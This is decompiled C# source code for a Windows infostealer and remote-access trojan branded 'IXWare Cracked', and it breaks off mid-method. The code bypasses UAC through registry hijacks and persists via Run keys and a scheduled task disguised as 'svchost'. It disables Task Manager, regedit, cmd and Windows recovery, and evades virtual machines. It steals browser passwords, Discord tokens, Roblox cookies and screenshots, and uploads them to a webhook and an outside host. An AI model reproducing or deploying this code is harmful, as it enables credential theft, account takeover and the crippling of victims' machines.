using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace IXWare
{
    internal class Class0
    {
        [CompilerGenerated]
        private sealed class Class1
        {
            public string string_0;

            internal async Task method_0()
            {
                while (true)
                {
                    Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
                    Graphics graphics = Graphics.FromImage(bitmap);
                    graphics.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
                    graphics.DrawString(font: new Font("Arial", 20f), brush: new SolidBrush(Color.Red), s: "Screenshot from " + Environment.UserName, x: 1100f, y: 1050f);
                    bitmap.Save(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + string_0 + ".png", ImageFormat.Png);
                    new WebClient().UploadFile(new Uri(string_4), Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + string_0 + ".png");
                    Thread.Sleep(smethod_0());
                }
            }
        }

        private const uint uint_0 = 4098u;

        private const uint uint_1 = 1024u;

        public static bool bool_0 = bool.Parse("true");

        public static bool bool_1 = bool.Parse("true");

        public static bool bool_2 = bool.Parse("true");

        public static bool bool_3 = bool.Parse("true");

        public static bool bool_4 = bool.Parse("true");

        public static bool bool_5 = bool.Parse("true");

        public static bool bool_6 = bool.Parse("true");

        public static bool bool_7 = bool.Parse("true");

        public static bool bool_8 = bool.Parse("false");

        public static bool bool_9 = bool.Parse("false");

        public static int int_0 = int.Parse("0");

        public static bool bool_10 = bool.Parse("true");

        public static bool bool_11 = bool.Parse("true");

        public static bool bool_12 = bool.Parse("true");

        public static bool bool_13 = bool.Parse("false");

        public static bool bool_14 = bool.Parse("true");

        public static string string_0 = "#noteCaption";

        public static string string_1 = "#noteMSG";

        public static bool bool_15 = bool.Parse("true");

        public static bool bool_16 = bool.Parse("true");

        public static bool bool_17 = bool.Parse("true");

        public static bool bool_18 = bool.Parse("true");

        public static string string_2 = smethod_2();

        public static string string_3 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + Environment.UserName + "_" + smethod_2() + ".zip";

        public static string string_4 = "CUSTOMWEBHOOK";

        public static string string_5 = "UBCZlFsi2hFqV1TIlC9lOnMmdAm8irHL5fOjH37s37RPam2AL8";

        public static string string_6 = "UBCZlFsi2hFqV1TIlC9lOnMmdAm8irHL5fOjH37s37RPam2AL8";

        public static string string_7 = smethod_2();

        private static List<string> list_0 = new List<string>();

        private static List<string> list_1 = new List<string>();

        private static bool Boolean_0 => new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool GetPhysicallyInstalledSystemMemory(out long long_0);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr intptr_0, int int_1, ref int int_2, int int_3);

        public static int smethod_0()
        {
            return (int)TimeSpan.FromMinutes(int_0).TotalMilliseconds;
        }

        public static string smethod_1(string string_8, string string_9, string string_10, string string_11 = "", string string_12 = "", string string_13 = "", string string_14 = "", string string_15 = "", string string_16 = "", string string_17 = "", string string_18 = "", string string_19 = "", string string_20 = "", string string_21 = "", string string_22 = "", string string_23 = "", string string_24 = "", string string_25 = "", string string_26 = "", string string_27 = "", string string_28 = "", string string_29 = "", string string_30 = "", string string_31 = "", string string_32 = "", string string_33 = "", string string_34 = "", string string_35 = "", string string_36 = "", string string_37 = "", string string_38 = "", string string_39 = "", string string_40 = "", string string_41 = "", string string_42 = "")
        {
            string text = "";
            string text2 = "";
            string text3 = "";
            string text4 = "";
            string text5 = "";
            string text6 = "";
            string text7 = "";
            string text8 = "";
            string text9 = "";
            string text10 = "";
            string text11 = "";
            string text12 = "";
            string text13 = "";
            string text14 = "";
            string text15 = "";
            string text16 = "";
            if (string_12 != "")
            {
                text = "\r\n        {\r\n          \"name\": \"" + string_11 + "\",\r\n          \"value\": \"" + string_12 + "\"\r\n        }";
            }
            if (string_14 != "")
            {
                text2 = ",\r\n        {\r\n          \"name\": \"" + string_13 + "\",\r\n          \"value\": \"" + string_14 + "\"\r\n        }";
            }
            if (string_16 != "")
            {
                text3 = ",\r\n        {\r\n          \"name\": \"" + string_15 + "\",\r\n          \"value\": \"" + string_16 + "\"\r\n        }";
            }
            if (string_18 != "")
            {
                text4 = ",\r\n        {\r\n          \"name\": \"" + string_17 + "\",\r\n          \"value\": \"" + string_18 + "\"\r\n        }";
            }
            if (string_20 != "")
            {
                text5 = ",\r\n        {\r\n          \"name\": \"" + string_19 + "\",\r\n          \"value\": \"" + string_20 + "\"\r\n        }";
            }
            if (string_22 != "")
            {
                text6 = ",\r\n        {\r\n          \"name\": \"" + string_21 + "\",\r\n          \"value\": \"" + string_22 + "\"\r\n        }";
            }
            if (string_24 != "")
            {
                text7 = ",\r\n        {\r\n          \"name\": \"" + string_23 + "\",\r\n          \"value\": \"" + string_24 + "\"\r\n        }";
            }
            if (string_26 != "")
            {
                text8 = ",\r\n        {\r\n          \"name\": \"" + string_25 + "\",\r\n          \"value\": \"" + string_26 + "\"\r\n        }";
            }
            if (string_28 != "")
            {
                text9 = ",\r\n        {\r\n          \"name\": \"" + string_27 + "\",\r\n          \"value\": \"" + string_28 + "\"\r\n        }";
            }
            if (string_30 != "")
            {
                text10 = ",\r\n        {\r\n          \"name\": \"" + string_29 + "\",\r\n          \"value\": \"" + string_30 + "\"\r\n        }";
            }
            if (string_32 != "")
            {
                text11 = ",\r\n        {\r\n          \"name\": \"" + string_31 + "\",\r\n          \"value\": \"" + string_32 + "\"\r\n        }";
            }
            if (string_34 != "")
            {
                text12 = ",\r\n        {\r\n          \"name\": \"" + string_33 + "\",\r\n          \"value\": \"" + string_34 + "\"\r\n        }";
            }
            if (string_36 != "")
            {
                text13 = ",\r\n        {\r\n          \"name\": \"" + string_35 + "\",\r\n          \"value\": \"" + string_36 + "\"\r\n        }";
            }
            if (string_38 != "")
            {
                text14 = ",\r\n        {\r\n          \"name\": \"" + string_37 + "\",\r\n          \"value\": \"" + string_38 + "\"\r\n        }";
            }
            if (string_40 != "")
            {
                text15 = ",\r\n        {\r\n          \"name\": \"" + string_39 + "\",\r\n          \"value\": \"" + string_40 + "\"\r\n        }";
            }
            if (string_42 != "")
            {
                text16 = ",\r\n        {\r\n          \"name\": \"" + string_41 + "\",\r\n          \"value\": \"" + string_42 + "\"\r\n        }";
            }
            string result = "";
            WebClient webClient = new WebClient();
            webClient.Headers["Content-Type"] = "application/json";
            byte[] bytes = Encoding.ASCII.GetBytes("{\r\n  \"embeds\": [\r\n    {\r\n                    \"title\": \"" + string_8 + "\",\r\n      \"color\": 16711680,\r\n      \"footer\": {\r\n                        \"icon_url\": \"" + string_9 + "\",\r\n        \"text\": \"IXWare Cracked\"\r\n      },\r\n      \"thumbnail\": {\r\n                        \"url\": \"" + string_10 + "\"\r\n      },\r\n      \"fields\": [\r\n        " + text + "\r\n        " + text2 + "\r\n        " + text3 + "\r\n        " + text4 + "\r\n        " + text5 + "\r\n        " + text6 + "\r\n        " + text7 + "\r\n        " + text8 + "\r\n        " + text9 + "\r\n        " + text10 + "\r\n        " + text11 + "\r\n        " + text12 + "\r\n        " + text13 + "\r\n        " + text14 + "\r\n        " + text15 + "\r\n        " + text16 + "\r\n      ]\r\n    }\r\n  ]\r\n}");
            webClient.UploadData(string_4, bytes);
            return result;
        }

        public static string smethod_2()
        {
            RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
            byte[] array = new byte[20];
            rNGCryptoServiceProvider.GetBytes(array);
            return BitConverter.ToString(array).Replace("-", string.Empty);
        }

        public static void smethod_3(int int_1 = 1, int int_2 = 29)
        {
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, int_2, ref int_1, 4);
        }

        private static void smethod_4(object sender, SessionEndedEventArgs e)
        {
            smethod_3(0);
        }

        private static void Main(string[] args)
        {

            // File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\IDF.txt", string_5);
            ServiceController[] services = ServiceController.GetServices();
            foreach (ServiceController serviceController in services)
            {
                if ((serviceController.ServiceName == "QEMU-GA" || serviceController.ServiceName == "VBoxService") && serviceController.Status.Equals(ServiceControllerStatus.Running))
                {
                    //   Environment.Exit(0);
                    //  continue;
                }

                if (bool_18)
                {
                    //  new Mutex(initiallyOwned: true, Process.GetCurrentProcess().ProcessName, out bool createdNew);
                    //  if (!createdNew)
                    //  {
                    //     break;
                    //  }
                }
                if (bool_0)
                {
                    if (!Boolean_0)
                    {
                        foreach (ManagementObject item in new ManagementObjectSearcher("select * from Win32_OperatingSystem").Get())
                        {
                            string text = item["Caption"].ToString();
                            if (text.Contains("7"))
                            {
                                Process process = new Process();
                                process.StartInfo.FileName = "cmd.exe";
                                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                                process.StartInfo.Arguments = "/k reg add HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command /d \"" + Environment.GetCommandLineArgs()[0] + "\" /f && START /W CompMgmtLauncher.exe && reg delete HKEY_CURRENT_USER\\Software\\Classes\\mscfile /f";
                                process.Start();
                            }
                            if (text.Contains("vista"))
                            {
                                Process process2 = new Process();
                                process2.StartInfo.FileName = "cmd.exe";
                                process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                                process2.StartInfo.Arguments = "/k reg add HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command /d \"" + Environment.GetCommandLineArgs()[0] + "\" /f && START /W CompMgmtLauncher.exe && reg delete HKEY_CURRENT_USER\\Software\\Classes\\mscfile /f";
                                process2.Start();
                            }
                            if (text.Contains("8"))
                            {
                                Process process3 = new Process();
                                process3.StartInfo.FileName = "cmd.exe";
                                process3.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                                process3.StartInfo.Arguments = "/k reg add HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command /d \"" + Environment.GetCommandLineArgs()[0] + "\" /f && START /W CompMgmtLauncher.exe && reg delete HKEY_CURRENT_USER\\Software\\Classes\\mscfile /f";
                                process3.Start();
                            }
                            if (text.Contains("10"))
                            {
                                Process process4 = new Process();
                                process4.StartInfo.FileName = "cmd.exe";
                                process4.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                                process4.StartInfo.Arguments = "/k reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f && reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d \"" + Environment.GetCommandLineArgs()[0] + "\" /f && START /W fodhelper.exe && reg delete HKCU\\Software\\Classes\\ms-settings /f";
                                process4.Start();
                            }
                        }
                        Environment.Exit(0);
                    }
                    else
                    {
                        File.Move(Assembly.GetEntryAssembly().Location, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Windows\\" + string_7 + ".exe");
                        File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Windows\\" + string_7 + ".exe", FileAttributes.Hidden);
                        smethod_19();
                        smethod_6();
                        smethod_5();
                        smethod_7();
                        smethod_9();
                        smethod_10();
                        smethod_11();
                        smethod_12();
                        smethod_18();
                        smethod_20();
                        smethod_19();
                        smethod_13();
                        smethod_14();
                        smethod_16();
                        smethod_17();
                        smethod_15();
                        smethod_8();
                        smethod_21();
                    }
                }
                else if (!bool_0)
                {
                    File.Move(Assembly.GetEntryAssembly().Location, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Windows\\" + string_7 + ".exe");
                    File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Windows\\" + string_7 + ".exe", FileAttributes.Hidden);
                    smethod_19();
                    smethod_6();
                    smethod_5();
                    smethod_9();
                    smethod_10();
                    smethod_11();
                    smethod_12();
                    smethod_18();
                    smethod_20();
                    smethod_13();
                    smethod_14();
                    smethod_16();
                    smethod_17();
                    smethod_15();
                    smethod_8();
                    smethod_21();
                }

            }
        }

        private static void smethod_5()
        {
            if (bool_14)
            {
                long num;
                GetPhysicallyInstalledSystemMemory(out num);
                string oSFullName = new ComputerInfo().OSFullName;
                smethod_1(Environment.UserName ?? "", "https://businessdev.xyz/ix/IXWARELOGO.png", "https://businessdev.xyz/ix/IXWARELOGO.png", "UAC Bypassed", Boolean_0.ToString(), "IP", smethod_44(), "Country", smethod_32(), "OS", oSFullName, "AntiVirus", smethod_43(), "Firewall", smethod_41(), "RAM", string.Format("{0} GB of ram installed.", num / 1024L / 1024L), "Bios", smethod_40(), "Mainboard", smethod_39(), "CPU", smethod_38(), "GPU", smethod_37(), "Lan IP", smethod_36(), "Mac Address", smethod_34(), "PC Type", smethod_33(), "Time", DateTime.Now.ToString("HH:mm:ss tt"));
            }
        }

        private static void smethod_6()
        {
            if (bool_1)
            {
                if (!Boolean_0)
                {
                    Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true).SetValue(string_7 ?? "", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Windows\\" + string_7 + ".exe");
                    return;
                }
                Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true).SetValue(string_7 ?? "", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Windows\\" + string_7 + ".exe");
                ProcessStartInfo processStartInfo = new ProcessStartInfo("schtasks");
                processStartInfo.Arguments = "/create /tn \"svchost\" /sc ONLOGON /tr \"" + Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Windows\\" + string_7 + ".exe\" /rl HIGHEST /f";
                processStartInfo.UseShellExecute = false;
                processStartInfo.CreateNoWindow = true;
                Process.Start(processStartInfo);
            }
        }

        private static void smethod_7()
        {
            if (bool_2)
            {
                SystemEvents.SessionEnded += smethod_4;
                smethod_3();
            }
        }

        private static void smethod_8()
        {
            if (bool_3)
            {
                Process.Start(new ProcessStartInfo
                {
                    Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + Assembly.GetExecutingAssembly().Location,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "cmd.exe"
                });
            }
        }

        private static void smethod_9()
        {
            if (bool_4)
            {
                Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Taskmgr.exe", "Debugger", "C:\\Windows\\System32\\" + smethod_2() + ".exe");
                Process[] processesByName = Process.GetProcessesByName("Taskmgr");
                for (int i = 0; i < processesByName.Length; i++)
                {
                    processesByName[i].Kill();
                }
            }
        }

        private static void smethod_10()
        {
            if (bool_5)
            {
                Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\regedit.exe", "Debugger", "C:\\Windows\\System32\\" + smethod_2() + ".exe");
                Process[] processesByName = Process.GetProcessesByName("regedit");
                for (int i = 0; i < processesByName.Length; i++)
                {
                    processesByName[i].Kill();
                }
            }
        }

        private static void smethod_11()
        {
            if (bool_6)
            {
                Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\cmd.exe", "Debugger", "C:\\Windows\\System32\\" + smethod_2() + ".exe");
                Process[] processesByName = Process.GetProcessesByName("cmd");
                for (int i = 0; i < processesByName.Length; i++)
                {
                    processesByName[i].Kill();
                }
            }
        }

        private static void smethod_12()
        {
            if (bool_7)
            {
                Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\msconfig.exe", "Debugger", "C:\\Windows\\System32\\" + smethod_2() + ".exe");
                Process[] processesByName = Process.GetProcessesByName("msconfig");
                for (int i = 0; i < processesByName.Length; i++)
                {
                    processesByName[i].Kill();
                }
            }
        }

        private static void smethod_13()
        {
            if (!bool_9)
            {
                return;
            }
            string string_0 = smethod_2();
            Task.Run(async delegate
            {
                while (true)
                {
                    Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
                    Graphics graphics = Graphics.FromImage(bitmap);
                    graphics.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
                    graphics.DrawString(font: new Font("Arial", 20f), brush: new SolidBrush(Color.Red), s: "Screenshot from " + Environment.UserName, x: 1100f, y: 1050f);
                    bitmap.Save(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + string_0 + ".png", ImageFormat.Png);
                    new WebClient().UploadFile(new Uri(string_4), Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + string_0 + ".png");
                    Thread.Sleep(smethod_0());
                }
            });
        }

        private static void smethod_14()
        {

            try
            {
                if (!bool_10)
                {
                    return;
                }
                string str = smethod_2();
                StreamWriter streamWriter = new StreamWriter(new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + str + ".txt", FileMode.OpenOrCreate, FileAccess.Write));
                foreach (GClass2 item in GClass4.smethod_0())
                {
                    streamWriter.Write("IXWare Cracked\r\nWebsite: " + item.String_2 + "\r\nUsername: " + item.String_0 + "\r\nPassword: " + item.String_1 + "\r\nBrowser: " + item.String_3 + "\r\n\r\n");
                }
                streamWriter.Close();
                new WebClient().UploadFile(new Uri(string_4), Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + str + ".txt");
                File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + str + ".txt");
            }
            catch (Exception)
            {
            }
        }

        private static async void smethod_15()
        {
            if (!bool_11)
            {
                return;
            }
            bool flag = true;
            while (flag)
            {
                Process[] processesByName = Process.GetProcessesByName("RobloxPlayerBeta");
                for (int i = 0; i < processesByName.Length; i++)
                {
                    string str = smethod_30(Process.GetProcessesByName("RobloxPlayerBeta")[0]).Split(' ')[5];
                    string string_ = await smethod_31("https://businessdev.xyz/ix/auth2cookie.php?auth=" + str);
                    smethod_1(Environment.UserName ?? "", "https://businessdev.xyz/ix/IXWARELOGO.png", "https://businessdev.xyz/ix/IXWARELOGO.png", "Cookie", smethod_26(string_));
                    flag = false;
                }
            }
        }

        private static void smethod_16()
        {
            if (!bool_12)
            {
                return;
            }
            try
            {
                smethod_22(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\");
                smethod_23();
                foreach (string item in list_1)
                {
                    try
                    {
                        smethod_1(Environment.UserName ?? "", "https://businessdev.xyz/ix/IXWARELOGO.png", "https://businessdev.xyz/ix/IXWARELOGO.png", "Discord Token", item);
                    }
                    catch
                    {
                    }
                }
            }
            catch (Exception)
            {
            }
        }

        private static void smethod_17()
        {
            if (bool_13)
            {
                MessageBox.Show(string_1, string_0, MessageBoxButtons.OK, MessageBoxIcon.Hand);
            }
        }

        private static async void smethod_18()
        {
            if (!bool_15)
            {
                return;
            }
            await Task.Run(async delegate
            {
                try
                {
                    foreach (ManagementObject item in new ManagementObjectSearcher("select * from Win32_OperatingSystem").Get())
                    {
                        string text = item["Caption"].ToString();
                        if (text.Contains("7"))
                        {
                            try
                            {
                                Process process = new Process();
                                process.StartInfo.FileName = "cmd.exe";
                                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                                process.StartInfo.Arguments = "/c reagentc /disable";
                                process.Start();
                                Process process2 = new Process();
                                process2.StartInfo.FileName = "cmd.exe";
                                process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                                process2.StartInfo.Arguments = "/c bcdedit /set {default} recoveryenabled No";
                                process2.Start();
                            }
                            catch (Exception)
                            {
                            }
                        }
                        if (text.Contains("8"))
                        {
                            try
                            {
                                Process process3 = new Process();
                                process3.StartInfo.FileName = "cmd.exe";
                                process3.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                                process3.StartInfo.Arguments = "/c reagentc.exe /disable";
                                process3.Start();
                                Process process4 = new Process();
                                process4.StartInfo.FileName = "cmd.exe";
                                process4.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                                process4.StartInfo.Arguments = "/c bcdedit /set {default} recoveryenabled No";
                                process4.Start();
                            }
                            catch (Exception)
                            {
                            }
                        }
                        if (text.Contains("Vista"))
                        {
                            try
                            {
                                Process process5 = new Process();
                                process5.StartInfo.FileName = "cmd.exe";
                                process5.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                                process5.StartInfo.Arguments = "/c reagentc /disable";
                                process5.Start();
                                Process process6 = new Process();
                                process6.StartInfo.FileName = "cmd.exe";
                                process6.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                                process6.StartInfo.Arguments = "/c bcdedit /set {default} recoveryenabled No";
                                process6.Start();
                            }
                            catch (Exception)
                            {
                            }
                        }
                        if (text.Contains("10"))
                        {
                            try
                            {
                                Process process7 = new Process();
                                process7.StartInfo.FileName = "cmd.exe";
                                process7.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                                process7.StartInfo.Arguments = "/c reagentc.exe /disable";
                                process7.Start();
                                Process process8 = new Process();
                                process8.StartInfo.FileName = "cmd.exe";
                                process8.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                                process8.StartInfo.Arguments = "/c bcdedit /set {default} recoveryenabled No";
                                process8.Start();
                            }
                            catch (Exception)
                            {
                            }
                        }
                    }
                }
                catch (Exception)
                {
                }
            });
        }

        private static void smethod_19()
        {
            if (!bool_16)
            {
                return;
            }
            GetPhysicallyInstalledSystemMemory(out long long_);
            foreach (ManagementObject item in new ManagementObjectSearcher("select * from Win32_OperatingSystem").Get())
            {
                _ = item;
                if (long_ / 1024L / 1024L < 4L)
                {
                    Environment.Exit(0);
                }
            }
        }

        private static void smethod_20()
        {
            if (bool_17)
            {
                Class3.smethod_0();
            }
        }

        private static void smethod_21()
        {
            Thread.Sleep(-1);
        }

        private static void smethod_22(string string_8)
        {
            try
            {
                FileInfo[] files = new DirectoryInfo(string_8).GetFiles();
                foreach (FileInfo fileInfo in files)
                {
                    if (fileInfo.Name.EndsWith(".ldb") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
                    {
                        list_0.Add(string_8 + fileInfo.Name);
                    }
                }
            }
            catch (Exception)
            {
            }
        }

        private static void smethod_23()
        {
            try
            {
                foreach (string item2 in list_0)
                {
                    string item = smethod_24(item2);
                    list_1.Add(item);
                }
            }
            catch (Exception)
            {
            }
        }

        public static string smethod_24(string string_8, bool bool_19 = false)
        {
            try
            {
                byte[] bytes = File.ReadAllBytes(string_8);
                string @string = Encoding.UTF8.GetString(bytes);
                string text = "";
                string text2 = @string;
                while (text2.Contains("oken"))
                {
                    string[] array = smethod_25(text2).Split('"');
                    text = array[0];
                    text2 = string.Join("\"", array);
                    if (bool_19 && text.Length == 59)
                    {
                        break;
                    }
                }
                return text;
            }
            catch (Exception)
            {
                return "Error";
            }
        }

        private static string smethod_25(string string_8)
        {
            try
            {
                string[] collection = string_8.Substring(string_8.IndexOf("oken") + 4).Split('"');
                List<string> list = new List<string>();
                list.AddRange(collection);
                list.RemoveAt(0);
                collection = list.ToArray();
                return string.Join("\"", collection);
            }
            catch (Exception)
            {
                return "Error";
            }
        }

        public static string smethod_26(string string_8)
        {
            string s = "gtRLXpgsUjKfpTN5vdaen9fHjRLSDVYwfC45g7X37rfM9HaZSvhvDj8vnqBVSJRmnP5GeP7x87BTMG8gvUBMmgLLMypL69axr6LxQH8mJPN2LaWgTRrNZjTWGbt5TH95Exu4vq9k6JQpppb9ee5SPKV2e6fMrw6QAhWqY6nykJqMPsWxCkg8KXzrbFZEkSpvrz6Qcz9bwtCSmKDY6KAmdZyv9nQQ56y7p8pKtq4S93jmEajAnfyb9dT2uCJDpyWJy5u5CQubmaeECqDVFgYUPD2WNB9nQGSGWzaPrpQ8p5ByXu5CMqctFRgC3r22XgfzH8cwzmL3LZDHwDX6A5saJnu4aWCauVMYRRkEqRsvEuk33aXBgTC3XWy884GMg8HGUPtuNcBGYdA9BJq9fJv26K4UYjrQvkEanDskWAwDzZXJJs8qCFcKqwjk9BXnSBUFa9ZUBam4ZxvSFWDLZj6bEH9JmQZJeMBjAn27hvHsuZfbPFUqjzRXuyZNAHUgQXfnnBqgVGQJzAMXAKXXQVH9t3TEAaLDcAbykqjgZJRLD76SBATfuvDy6cC8R8eJM24sK5zhm9YcASNB8Wnf8dxP4g6jm79Aza5LtDhnncCEmAUZmNbWjrCtN7baFpPL6hFrDpvLMSCKe3rAymnja4fPAfrHER7CJJ87LcHkGngZtstyWPYaY2pUt8WqkFBqdJ5RfvD8ZsBqMVYCwEKg57rHvQnz89v6sqXh7Mftaj5eLRCsdAEykujL7Vt74USkZtZpwPbTVjaBMeWZ6J92PtcAns4LWAHbQDkA7crdvD7bSGjmLbBVffACPcmG4jJATwaXD4mMqVqL99KgPvaEbVb9eDQDn9ERejukkeU6qVZzTy7ayH9vHVxsYwrxqPsg929PwYfPbs2fe66wdmpj3Kx3ZXVL3brbWkrZrpmtBe7rrJ9kCe56cE38hGgLkDFRG53bSFySRVxE5BW8nNAUE73e5Hh7jJKFjg5EveU8X767yzHGT4gDjkbsrECtLNNu5GekvDtWBSjnBcRTRBQ7L9aG7F8knksyxLQpb72rHKcqaWZfLnMEeagDZ6gGaLezprh5jCEyA9a5xSqpCDvMcKRuMXBwEkt5NcYMTRU6JmRM9AcwgXSFQfvyMTEwBJ46cWKs9EeCYTApfhaAbp7La5sRNtyQ9cSbDpWSABAnnWMULbkJA4gG8EgQ3Q9QuPcPLybYPrYbdJwhE4ARpLcra58N796mAku9UMPEbqWx9EZGenwAghAtam8UsPsSR29nYgdsSUFcV6rjMhAPbKNudmUTUYXRmVtktE2FrVykjTYeZF53pXbDeq3AT6AAD33VwWcbHBQYR8Kz44QBLMBNEyQSKwwCJ7c3PWBF57zDbXgRQ3WGa4sJzaBCPENxRWEXEDwLbsQNVG24vzTBrsqbBHZFmpbqsQDGvhvzm5jcDM3bNEnEgyamjTqBmWDcSfT8mxLv3ZhdVKdrPHTDLBSVnfQngqXf33j3nC525Dm2zNjEgz5YsBHBkubRav33fwGAzNeNCJEz297mbxAvrH6HjXU3PQWqPQFJFy6VU3Rra5aXBS9LqnHaWhPY2dyTpTffHvnFKTdCnP8P2UbqtCEWdgpsveK6Lwg8U7ArbCsPsQdBU738tPyUuVyExZUepAFbeuBtzWe7HZTdVnXSYccDY2Qcr2tpqD8vFXEpbmAY8rnsvtgtXpANptHdmQkCcRCeNgA55TEZnzXTPHs58rQ5cvxuncatSq7hCLnqUwvHGBXZ5stvbKKuZ7DfAH7785KtN5mKcnPUNpycAY5EknFbLJNSKaG8M9J24KwDPWa5f4RHPekurnweEQek8S2XdzeQCBC9wUfL9GM5Zxx295rBT9HnYHRNghsqFy8AA8feSZ9NS9pjJwGnhJEqnnqtHD7FJ9e9BcBMNzE8mHu24mG8hX2ahPJRyJkWYAvBJLpgcqg3MdeUKQwmyERjJ7dJWkH5EQeeK3kgD9pHWjeqhQZ77qJuLACZXN32wCL2rFHpf2P7TSspBraA3VPES3W74gfmmXxR";
            byte[] byte_ = SHA256.Create().ComputeHash(Encoding.ASCII.GetBytes(s));
            byte[] byte_2 = new byte[16];
            return smethod_29(string_8, byte_, byte_2);
        }

        public static string smethod_27(string string_8)
        {
